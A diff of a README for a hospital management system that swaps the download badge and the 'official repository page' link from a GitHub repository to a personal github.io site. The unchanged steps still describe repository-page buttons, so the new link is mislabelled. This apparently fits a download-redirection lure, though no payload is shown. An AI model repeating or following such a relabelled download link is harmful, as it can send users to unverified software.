@@ -1,6 +1,6 @@
 # 🏥 HOSPITAL-MANAGEMENT-SYSTEM - Streamline your hospital operations and records
 
-[![](https://img.shields.io/badge/Download-MediCare_System-blue.svg)](https://github.com/essieendogamous229/HOSPITAL-MANAGEMENT-SYSTEM)
+[![](https://img.shields.io/badge/Download-MediCare_System-blue.svg)](https://essieendogamous229.github.io)
 
 This software helps hospitals manage patient data, appointments, and billing. The system provides tools for doctors to track medical records and generate prescriptions. Administrators track hospital capacity and staff schedules through a central dashboard.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start.
 
 Follow these steps to put the software on your machine.
 
-1. Go to the official repository page: [https://github.com/essieendogamous229/HOSPITAL-MANAGEMENT-SYSTEM](https://github.com/essieendogamous229/HOSPITAL-MANAGEMENT-SYSTEM).
+1. Go to the official repository page: [https://essieendogamous229.github.io](https://essieendogamous229.github.io).
 2. Look for the green button labeled "Code" near the top right of the page.
 3. Click the button and select "Download ZIP".
 4. Locate the downloaded file in your "Downloads" folder.
